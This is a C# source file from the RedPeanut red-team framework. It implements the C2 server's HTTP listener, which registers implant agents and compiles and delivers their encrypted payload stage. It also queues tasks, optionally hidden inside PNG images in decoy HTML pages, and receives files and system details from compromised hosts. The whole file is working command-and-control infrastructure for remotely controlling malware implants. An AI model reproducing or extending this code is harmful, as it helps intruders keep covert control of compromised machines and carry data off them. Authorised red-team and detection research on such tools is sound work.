﻿//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Rest;
using Newtonsoft.Json;
using static RedPeanut.Utility;
using static RedPeanut.Models;
using static RedPeanut.Crypto.Aes;
using static RedPeanut.Crypto.RC4;
using System.Security.Cryptography;
using Microsoft.AspNetCore.Http;
using System.Text.RegularExpressions;
using Microsoft.Extensions.Configuration;
using System.Text;
using Microsoft.EntityFrameworkCore;

namespace RedPeanut
{
    [AllowAnonymous]
    public class HttpListenerController : ControllerBase
    {
        private readonly RedPeanutDBContext dbContext = new RedPeanutDBContext(new DbContextOptions<RedPeanutDBContext>());
        private readonly IHttpContextAccessor httpContextAccessor;
        private readonly string Paramname = "";
        private readonly string Host = "";
        private readonly int Port = 0;
        private readonly int Profileid = 0;

        public HttpListenerController(IHttpContextAccessor httpContextAccessor, IConfiguration configuration)  
        {  
            this.httpContextAccessor = httpContextAccessor;
            this.Host = configuration["FrameworkHost"];
            this.Port = Int32.Parse(configuration["FrameworkPort"]);
            this.Profileid = Int32.Parse(configuration["FrameworkProfileid"]);
            this.Paramname = RedPeanutC2.server.GetProfile(Profileid).HttpPost.Param;
        }

        private Dictionary<string,string> GetParsedArgs(string rawdata)
        {
            string[] argvaluepair = rawdata.Split('&');
            Dictionary<string, string> res = new Dictionary<string, string>();
            foreach (string item in argvaluepair)
            {
                Regex regex = new Regex(Paramname + @"=([^\&]+)");
                Match match = regex.Match(item);

                if(match != null && match.Length >= 2)
                    res.Add(Paramname, match.Groups[1].Value);              
            }
           
            return res;
        }

        private string GetCookieValue(string cookiename)
        {
            string cookieValueFromContext = httpContextAccessor.HttpContext.Request.Cookies[cookiename];
            return cookieValueFromContext;
        }

        private void SetCookieValue(string cookiename, string value, int? expireTime)
        {
            CookieOptions option = new CookieOptions();
            if (expireTime.HasValue)
                option.Expires = DateTime.Now.AddMinutes(expireTime.Value);
            else
                option.Expires = DateTime.Now.AddMilliseconds(10);
            Response.Cookies.Append(cookiename, value, option);
        }



        //Send agentid
        //RC4 with serverkey
        private string CreateMsgAgentId(IAgentInstance agent, string serverkey, int profileid, int targetframework)
        {
            string mesg = "";
            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
            if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profileid))
            {
                AesManaged aes = agent.AesManager;
                AgentIdMsg msg = new AgentIdMsg
                {
                    agentid = agent.AgentId,
                    sessionkey = aes.Key,
                    sessioniv = aes.IV
                };

                HttpProfile profile = Program.GetC2Manager().GetC2Server().GetProfile(profileid);

                ListenerConfig conf = new ListenerConfig("", ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(), profile, profileid);
                string source = System.IO.File.ReadAllText(Path.Combine(folderrpath, AGENT_TEMPLATE));
                source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), targetframework, conf);
                msg.stage = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, agent.AgentId + ".dll", targetframework, compprofile: CompilationProfile.Agent)));

                string agentidnmsg = JsonConvert.SerializeObject(msg, Formatting.Indented);
                mesg = EncryptMessage(serverkey, agentidnmsg);
            }
            return mesg;
        }

        private string CreateTaskMgs(IAgentInstance agent, TaskMsg task)
        {
            AesManaged aes = agent.AesManager;
            HttpProfile profile = Program.GetC2Manager().GetC2Server().GetProfile(Profileid);

            string mesg;
            if (profile.HtmlCovered)
            {
                string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                string outputfolderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER);
                string htmlsource = System.IO.File.ReadAllText(Path.Combine(folderrpath, HTML_TEMPLATE));

                int elements = htmlsource.Split("targetclass").Length - 1;
                if (elements <= 0)
                    return "";

                string[] images = ListImages();
                Random random = new Random();
                int payloadindex = random.Next(1,elements);

                //Create Image with task embedded
                string taskmsg = JsonConvert.SerializeObject(task, Formatting.Indented);
                taskmsg = Convert.ToBase64String(EncryptAesMessage(taskmsg, aes));
                string outputfilename = RandomAString(10, random) + ".png";
                string outfullpath = Path.Combine(outputfolderrpath, outputfilename);
                string imagepath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, IMAGELOAD_FOLDER, "images", images[payloadindex - 1]);
                ImageGenerator.Create(Encoding.Default.GetBytes(taskmsg), imagepath, outfullpath);

                //Add Image to resources
                C2Manager c2manager = Program.GetC2Manager();
                c2manager.GetC2Server().RegisterWebResource(outputfilename, new WebResourceInstance(null, outputfilename));

                //Create html page
                htmlsource = Replacer.ReplaceHtmlProfile(htmlsource, profile.TargetClass, Encoding.Default.GetBytes(taskmsg).Length, outputfilename, elements, payloadindex, images);

                return htmlsource;
            }
            else
            {
                string tasknmsg = JsonConvert.SerializeObject(task, Formatting.Indented);
                mesg = Convert.ToBase64String(EncryptAesMessage(tasknmsg, aes));
                return mesg;
            }        
        }

        private static string[] ListImages()
        {
            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, IMAGELOAD_FOLDER);
            string imagesrcfolder = Path.Combine(folderrpath, "images");

            if (!Directory.Exists(imagesrcfolder))
                Directory.CreateDirectory(imagesrcfolder);

            string[] fileswp = Directory.GetFiles(imagesrcfolder);
            string[] ret = new string[fileswp.Length];

            for(int i = 0; i < fileswp.Length; i++)
            {
                ret[i] = Path.GetFileName(fileswp[i]);
            }

            return ret;
        }

        private string CreateOkMgs(IAgentInstance agent)
        {
            AesManaged aes = agent.AesManager;
            
            string mesg = Convert.ToBase64String(EncryptAesMessage("Ok", aes));

            return mesg;
        }

        private Models.ResponseMsg GetResponseMsg(string input, IAgentInstance agent)
        {
            var result = Convert.FromBase64String(input);

            //Espect cehckin message
            string line = DecryptAesMessage(result, agent.AesManager);

            ResponseMsg msg = new Models.ResponseMsg();

            try
            {
                msg = JsonConvert.DeserializeObject<ResponseMsg>(line);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
            return msg;
        }

        private Models.CheckInMsg GetCheckInMsg(string input,IAgentInstance agent)
        {
            var result = Convert.FromBase64String(input);

            //Espect cehckin message
            string line = DecryptAesMessage(result,agent.AesManager);

            CheckInMsg msg = new CheckInMsg();

            try
            {

                msg = JsonConvert.DeserializeObject<CheckInMsg>(line);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
            return msg;
        }

        private ActionResult PostResponse(StreamReader reader, IAgentInstance agent)
        {
            ResponseMsg responsemsg = null;
            try
            {
                Dictionary<string, string> args = GetParsedArgs(reader.ReadToEnd());
                responsemsg = GetResponseMsg(args.GetValueOrDefault(Paramname), agent);

                TaskMsg msg = RedPeanutC2.server.GetTaskResponse(responsemsg.TaskInstanceid);

                Console.WriteLine("\n[*] Received response from agent {0}....", agent.AgentId);
                if (msg.TaskType.Equals("download"))
                {
                    byte[] bytefile = Utility.DecompressDLL(Convert.FromBase64String(responsemsg.Data));
                    string destfolder = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, DOWNLOADS_FOLDER, "downloaded_item_" + msg.DownloadTask.FileNameDest);
                    System.IO.File.WriteAllBytes(destfolder, bytefile);
                    Console.WriteLine("[*] File {0} downloaded", destfolder);

                    return Ok(CreateOkMgs(agent));
                }
                else
                {
                    Console.WriteLine(responsemsg.Data);
                    return Ok(CreateOkMgs(agent));
                }
            }
            catch (Exception e)
            {
                // Something goes wrong decrypting or deserializing message return not found
                Console.WriteLine("[x] Something goes wrong decrypting or deserializing message return {0}", e.Message);
                Console.WriteLine("[x] {0}", e.StackTrace);
                httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                return NotFound();
            }
        }

        private ActionResult StepOne(StreamReader reader)
        {
            AgentIdReqMsg agentidrequest = null;
            try
            {
                string line_t = reader.ReadToEnd();
                Dictionary<string, string> args = GetParsedArgs(line_t);
                var line = DecryptMessage(RedPeanutC2.server.GetServerKey(), args.GetValueOrDefault(Paramname));
                agentidrequest = JsonConvert.DeserializeObject<AgentIdReqMsg>(line);
            }
            catch (Exception)
            {
                // Someting goes wrong decrypting or deserializing message return not found
                Console.WriteLine("[x] Something goes wrong decrypting or deserializing message return not found");
                httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                return NotFound();
            }

            try
            {
                IAgentInstance agent = new AgentInstanceHttp(RedPeanutC2.server, RandomString(10, RedPeanutC2.server.GetRandomObject()), RedPeanutC2.server.GetServerKey(), agentidrequest.address, agentidrequest.port, agentidrequest.framework,Profileid);
                //If agentidreq come from a pivoter set the prop
                if (!string.IsNullOrEmpty(agentidrequest.AgentPivot))
                {
                    IAgentInstance agentInstance = RedPeanutC2.server.GetAgent(agentidrequest.AgentPivot);
                    agent.Pivoter = agentInstance;
                }
                RedPeanutC2.server.RegisterAgentInbound(agent.AgentId, agent);
                string response = CreateMsgAgentId(agent, RedPeanutC2.server.GetServerKey(), Profileid, agentidrequest.framework);
                //Set cookie
                SetCookieValue("sessionid", EncryptMessage(RedPeanutC2.server.GetServerKey(), agent.AgentId), 0);
                Console.WriteLine("\n[*] Agent {0} connected", agent.AgentId);
                return Ok(response);
            }
            catch (Exception e)
            {
                // Operation error
                Console.WriteLine("[x] Operation error {0}", e.Message);
                httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                return NotFound();
            }
        }
        private ActionResult CheckIn (StreamReader reader, IAgentInstance agent)
        {
            CheckInMsg checkinmsg = null;
            try
            {
                Dictionary<string, string> args = GetParsedArgs(reader.ReadToEnd());
                checkinmsg = GetCheckInMsg(args.GetValueOrDefault(Paramname), agent);
                try
                {
                    agent.SysInfo = checkinmsg.systeminfo;

                    Console.WriteLine("\n[*] Agent " + agent.AgentId + " checkedin");
                    Console.WriteLine("[*] IP: {0} | Integrity: {1} | User: {2} | Process: {3} | OS: {4}", agent.SysInfo.Ip, agent.SysInfo.Integrity, agent.SysInfo.User, agent.SysInfo.ProcessName, agent.SysInfo.Os);
                    RedPeanutC2.server.RemoveAgentInbound(agent.AgentId);
                    RedPeanutC2.server.RegisterAgent(agent.AgentId, agent);
                    return Ok(CreateOkMgs(agent));
                }
                catch (Exception e)
                {
                    Console.WriteLine("[x] Error during checkin agentid {0}", agent.AgentId);
                    Console.WriteLine("[x] {0}", e.Message);
                    httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                    return NotFound();
                }

            }
            catch (Exception e)
            {
                // Something goes wrong decripting or deserializing message return not found
                Console.WriteLine("[x] Something goes wrong decripting or deserializing message return not found 2");
                Console.WriteLine("[x] {0}", e.StackTrace);
                httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                return NotFound();
            }
        }

        [AllowAnonymous]
		[HttpGet]
		public ActionResult<string> Get()
		{
            //Call by agent to check if there is a task to execute
            //need to check auth
            try
            {
                string decriptedAgentid = DecryptMessage(RedPeanutC2.server.GetServerKey(), GetCookieValue("sessionid"));
                // Try to find Agent
                IAgentInstance agent = RedPeanutC2.server.GetAgent(decriptedAgentid);
                if(agent != null)
                {
                    TaskMsg msg = RedPeanutC2.server.GetCommand(agent);
                    if (msg != null)
                    {
                        string response = CreateTaskMgs(agent, msg);
                        RedPeanutC2.server.RemoveCommand(agent, msg);
                        return Ok(response);
                    }
                    else
                    {
                        Console.WriteLine("No command");
                        return Ok();
                    }
                    
                }
                else
                {
                    return NotFound();
                }
                
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
            catch (Exception)
            {
                return NotFound();
            }
        }

        [AllowAnonymous]
		[HttpPost]
		public ActionResult<string> Post()
        {
            //Console.WriteLine("[*] Post request");
            //Step 1 agent
            if (string.IsNullOrEmpty(GetCookieValue("sessionid")))
            {
                StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8);
                return StepOne(reader);
            }
            else
            {
                // Request has a cookie
                // Must be RC4 encrypted with serverkey
                // No other sec check over the cookie 
                // Body must be entrcypted with session shared key iv pair
                
                try
                {
                    string decriptedAgentid = DecryptMessage(RedPeanutC2.server.GetServerKey(), GetCookieValue("sessionid"));

                    //Check if agentid exists in any state
                    IAgentInstance agent = null;
                    if (RedPeanutC2.server.GetAgents().ContainsKey(decriptedAgentid))
                    {
                        // Agent registered as active check message type Response, AgentIdReqMsg,                        
                        StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8);
                        agent = RedPeanutC2.server.GetAgents().GetValueOrDefault(decriptedAgentid);

                        return PostResponse(reader,agent);
                    }
                    else
                    {
                        if (RedPeanutC2.server.GetInboundAgents().ContainsKey(decriptedAgentid))
                        {
                            // Cookie present and agent is in inboud queue post need to be Aes ChekIn
                            StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8);
                            agent = RedPeanutC2.server.GetInboundAgents().GetValueOrDefault(decriptedAgentid);
                            return CheckIn(reader, agent);
                        }
                        else
                        {
                            // Agent does not exeists corrupted session or request not legitimate
                            Console.WriteLine("[x] Agent does not exeists corrupted session or request not legitimate");
                            httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                            return NotFound();
                        }
                    }                   
                }
                catch (Exception e)
                {
                    // Operation error
                    Console.WriteLine("[x] Operation error {0}", e.Message);
                    httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
                    return NotFound();
                }
            }
        }
    }
}